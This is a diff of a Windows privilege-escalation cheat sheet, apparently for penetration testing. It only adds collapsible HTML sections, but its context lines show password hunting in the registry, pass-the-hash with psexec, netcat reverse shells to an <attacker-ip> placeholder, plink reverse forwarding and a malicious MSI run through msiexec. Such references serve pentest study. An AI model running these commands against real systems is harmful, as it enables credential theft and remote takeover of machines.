@@ -124,7 +124,11 @@ If the unquoted service path is :code:`C:\Program Files\path to\service.exe`, yo
     C:\Program Files\path to.exe
     C:\Program Files\path to\service.exe
 
-Cleartext Passwords
+</details>
+<details>
+<summary>Cleartext Passwords</summary>
+ <br> 
+
 ===================
 
 Find passwords in arbitrary files:
@@ -169,7 +173,10 @@ Search for passwords in the registry:
     reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
     reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
 
-Passing the Hash
+</details>
+<details>
+<summary>Passing the Hash</summary>
+ <br> 
 ================
 
 The following commands can be used to dump password hashes:
@@ -226,7 +233,10 @@ Pass the hash locally using psexec:
 
     psexec64 \\<hostname> -u <username> -p <hash> -h "C:\Windows\Temp\nc.exe <attacker-ip> 53 -e cmd.exe"
 
-Loopback Services
+</details>
+<details>
+<summary>Loopback Services</summary>
+ <br> 
 =================
 
 Search for services listening on the loopback interface:
@@ -241,7 +251,10 @@ Use plink.exe to forward the loopback port to a port on our attacking host (via 
 
     plink.exe -l <attacker-username> -pw <attacker-password> <attacker-ip> -R <attacker-port>:127.0.0.1:<target-port>
 
-AlwaysInstallElevated
+</details>
+<details>
+<summary>AlwaysInstallElevated</summary>
+ <br> 
 =====================
 
 AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.
@@ -265,7 +278,11 @@ Use msiexec to run the malicious MSI:
 
     msiexec /quiet /qn /i C:\evil.msi
 
-Stored Credentials
+</details>
+<details>
+<summary>Stored Credentials</summary>
+ <br> 
+
 ==================
 
 If there are stored credentials, we can run commands as that user:
@@ -283,5 +300,8 @@ If there are stored credentials, we can run commands as that user:
 Execute commands by using runas with the /savecred argument. Note that full paths are generally needed:
 
 .. code-block:: none
+</details>
+
+
 
     runas /user:PWNED\Administrator /savecred "C:\Windows\System32\cmd.exe /c C:\Users\Public\nc.exe -nv <attacker-ip> <attacker-port> -e cmd.exe"
